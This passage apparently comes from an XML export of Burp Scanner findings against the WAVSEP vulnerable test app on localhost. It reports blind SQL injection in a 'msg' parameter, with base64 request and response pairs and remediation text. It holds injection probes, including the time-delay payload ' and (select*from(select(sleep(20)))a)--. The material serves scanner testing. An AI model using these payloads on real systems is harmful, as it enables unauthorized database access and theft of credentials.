      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDItQ29uZGl0aW9uYWxFcnJvci1SZXRyaWV2ZUFkbWluUGFzc3dvcmQtQmxpbmRFeHBsb2l0LmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NULUJsaW5kL0Nhc2UwMi1Db25kaXRpb25hbEVycm9yLVJldHJpZXZlQWRtaW5QYXNzd29yZC1CbGluZEV4cGxvaXQuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0Jw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDcxMg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMzo0MiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gSW50ZXJuYWwgU2VydmVyIEVycm9yPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDItQ29uZGl0aW9uYWxFcnJvci1SZXRyaWV2ZUFkbWluUGFzc3dvcmQtQmxpbmRFeHBsb2l0LmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NULUJsaW5kL0Nhc2UwMi1Db25kaXRpb25hbEVycm9yLVJldHJpZXZlQWRtaW5QYXNzd29yZC1CbGluZEV4cGxvaXQuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0Jyc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjQyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0MDkNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDIgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHRvIHRyaWdnZXIgZXJyb25lb3VzIHJlc3BvbnNlcyB0byBpbmZlciBpbmZvcm1hdGlvbi4gR29hbDogcmV0cmlldmUgJ2FkbWluJyBwYXNzd29yZCBpbmplY3RpbmcgaW4gR0VUIHBhcmFtZXRlci48L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDItQ29uZGl0aW9uYWxFcnJvci1SZXRyaWV2ZUFkbWluUGFzc3dvcmQtQmxpbmRFeHBsb2l0LmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NULUJsaW5kL0Nhc2UwMi1Db25kaXRpb25hbEVycm9yLVJldHJpZXZlQWRtaW5QYXNzd29yZC1CbGluZEV4cGxvaXQuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0JyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIw]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjAyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0MDkNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDIgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHRvIHRyaWdnZXIgZXJyb25lb3VzIHJlc3BvbnNlcyB0byBpbmZlciBpbmZvcm1hdGlvbi4gR29hbDogcmV0cmlldmUgJ2FkbWluJyBwYXNzd29yZCBpbmplY3RpbmcgaW4gR0VUIHBhcmFtZXRlci48L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1090165565988829184</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-Blind/Case03-TimeDelay-RetrieveAdminPassword-BlindExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-Blind/Case03-TimeDelay-RetrieveAdminPassword-BlindExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a general error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20013</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDMtVGltZURlbGF5LVJldHJpZXZlQWRtaW5QYXNzd29yZC1CbGluZEV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtQmxpbmQvQ2FzZTAzLVRpbWVEZWxheS1SZXRyaWV2ZUFkbWluUGFzc3dvcmQtQmxpbmRFeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDcxMg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMzo0MiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gSW50ZXJuYWwgU2VydmVyIEVycm9yPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDMtVGltZURlbGF5LVJldHJpZXZlQWRtaW5QYXNzd29yZC1CbGluZEV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtQmxpbmQvQ2FzZTAzLVRpbWVEZWxheS1SZXRyaWV2ZUFkbWluUGFzc3dvcmQtQmxpbmRFeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCcn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjQyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0MTMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDMgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHRvIHRyaWdnZXIgY29uZGl0aW9uYWwgdGltZSBkZWxheXMgdG8gaW5mZXIgaW5mb3JtYXRpb24uIEdvYWw6IHJldHJpZXZlICdhZG1pbicgcGFzc3dvcmQgaW5qZWN0aW5nIGluIEdFVCBwYXJhbWV0ZXIuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1CbGluZC9DYXNlMDMtVGltZURlbGF5LVJldHJpZXZlQWRtaW5QYXNzd29yZC1CbGluZEV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtQmxpbmQvQ2FzZTAzLVRpbWVEZWxheS1SZXRyaWV2ZUFkbWluUGFzc3dvcmQtQmxpbmRFeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMA==]]></request>
